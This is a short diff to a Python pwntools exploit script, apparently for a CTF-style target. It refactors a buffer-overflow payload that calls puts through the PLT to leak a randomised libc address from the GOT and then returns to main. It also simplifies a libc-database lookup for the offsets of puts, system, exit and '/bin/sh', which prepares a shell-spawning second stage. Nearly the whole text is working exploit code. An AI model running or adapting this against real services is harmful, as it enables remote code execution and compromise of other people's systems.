@@ -17,15 +17,9 @@ def leak_via_puts(conn, port,puts_got_addr, msg="puts"):
     Leaks randomised libc address via puts' PLT and function's GOT.
     """
     global proc 
-    proc = remote(conn,port)
-
-    payload = flat(
-        b'A' * BUFF_SIZE,
-        p32(PLT_PUTS),
-        p32(MAIN_ADDR),
-        p32(puts_got_addr),
-    )
     
+    proc = remote(conn,port)
+    payload = b'A' * BUFF_SIZE + p32(PLT_PUTS) + p32(MAIN_ADDR) + p32(puts_got_addr)
     proc.sendline(payload)
     skip_lines(proc, OUTPUT_LINES_BEFORE)
     puts_addr = u32(proc.recv(4))
@@ -85,8 +79,7 @@ def get_libc_symbol_offsets(libc_id):
     """
     Retrieves offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'.
     """
-    libc_id = libc_id['id']
-    libc_url = f"{LIBC_SEARCH_URL}{libc_id}"
+    libc_url = f"{LIBC_SEARCH_URL}{libc_id['id']}"
     
     # Request these symbols from the database
     symbols_of_interest = ["puts", "system", "exit", "str_bin_sh"]
